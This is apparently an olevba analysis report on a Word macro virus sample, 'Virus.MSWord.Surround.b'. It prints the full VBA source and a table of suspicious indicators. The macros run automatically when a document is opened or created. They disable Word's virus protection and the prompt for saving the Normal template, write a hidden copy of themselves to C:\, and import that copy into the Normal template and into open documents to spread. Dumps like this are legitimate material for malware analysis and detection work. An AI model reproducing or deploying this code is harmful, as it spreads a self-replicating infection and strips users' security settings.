olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Surround.b-5f98efb006af6009944ba67336ddd84ddbf63f8f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Surround.b-5f98efb006af6009944ba67336ddd84ddbf63f8f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Surround.bas 
in file: Virus.MSWord.Surround.b-5f98efb006af6009944ba67336ddd84ddbf63f8f - OLE stream: 'Macros/VBA/Surround'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    CreateKey
    DefaultOptions
    InsertInNormal
    InsertInActive
End Sub

Sub AutoNew()
    InsertInActive
End Sub

Sub DefaultOptions()
    Options.VirusProtection = False
    Options.BackgroundSave = True
    Options.SaveNormalPrompt = False
End Sub

Sub AutoExec()
    DefaultOptions
    If Month(Date) = 12 And Day(Date) = 29 Then
    End If
End Sub

Sub CreateKey()
    For Each component In ActiveDocument.VBProject.VBComponents
        If component.Name = "Surround" Then
            component.Export ("C:\Surround.key")
            SetAttr "C:\Surround.key", vbHidden + vbSystem
        End If
    Next component
End Sub

Sub InsertInNormal()
    For Each component In NormalTemplate.VBProject.VBComponents
        If component.Name = "Surround" Then Exit Sub
    Next component
    If Day(Date) = 21 Then
        Beep
    End If
    NormalTemplate.VBProject.VBComponents.Import ("C:\Surround.key")
End Sub

Sub InsertInActive()
    For Each component In ActiveDocument.VBProject.VBComponents
        If component.Name = "Surround" Then Exit Sub
    Next component
    ActiveDocument.VBProject.VBComponents.Import ("C:\Surround.key")
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

